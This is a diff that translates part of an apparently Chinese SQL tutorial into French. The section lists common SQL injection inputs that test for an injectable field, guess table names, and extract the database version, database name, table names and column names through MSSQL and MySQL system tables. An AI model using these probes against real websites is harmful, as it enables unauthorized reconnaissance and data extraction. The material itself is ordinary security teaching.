@@ -120,52 +120,52 @@ SELECT floor(3.14); -- renvoie 3
 SELECT rand(); -- renvoie 0.123456
 ```
 
-2.  **_SQL注入中的常用语句_** 
-   -  判断有无注入点：在URL或表单中输入如下语句，看页面是否有变化。 
+2. **_Énoncés couramment utilisés dans les injections SQL_** 
+   - Pour déterminer s'il existe un point d'injection : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si la page change. 
 ```sql
 ' and 1=1
-#或
+# ou
 ' and 1=2
 ```
  
 
-   -  猜测表名：在URL或表单中输入如下语句，看是否存在admin这张表。 
+   - Deviner le nom de la table : saisissez l'instruction suivante dans l'URL ou le formulaire pour vérifier si la table admin existe. 
 ```sql
 and 0<> (select count (*) from *)
-#或
+# ou
 and 0<> (select count (*) from admin)
 ```
  
 
-   -  获取数据库版本：在URL或表单中输入如下语句，看是否能显示数据库版本。 
+   - Obtenir la version de la base de données : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si la version de la base de données peut être affichée. 
 ```sql
 and 1= (select @@VERSION)
-#或
+# ou
 and 1= (select version())
 ```
  
 
-   -  获取数据库名：在URL或表单中输入如下语句，看是否能显示数据库名。 
+- Obtenir le nom de la base de données : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si le nom de la base de données peut être affiché.
 ```sql
 and 1= (select db_name ())
-#或
+#ou
 and 1= (select database())
 ```
  
 
-   -  获取表名：在URL或表单中输入如下语句，看是否能显示表名。 
+   - Obtenir le nom de la table : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si le nom de la table peut être affiché. 
 ```sql
 and 1= (select top 1 name from sysobjects where xtype='U')
-#或
+#ou
 and 1= (select table_name from information_schema.tables limit 1)
 ```
  
 
-   -  获取列名：在URL或表单中输入如下语句，看是否能显示列名。 
+   - Obtenir le nom de la colonne : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si le nom de la colonne peut être affiché. 
 ```sql
-and 1= (select top 1 name from syscolumns where id=object_id('表名')
-#或
-and 1= (select column_name from information_schema.columns where table_name='表名'limit 1)
+and 1= (select top 1 name from syscolumns where id=object_id('nom de la table')
+# ou
+and 1= (select column_name from information_schema.columns where table_name='nom de la table'limit 1)
 ```
  
 
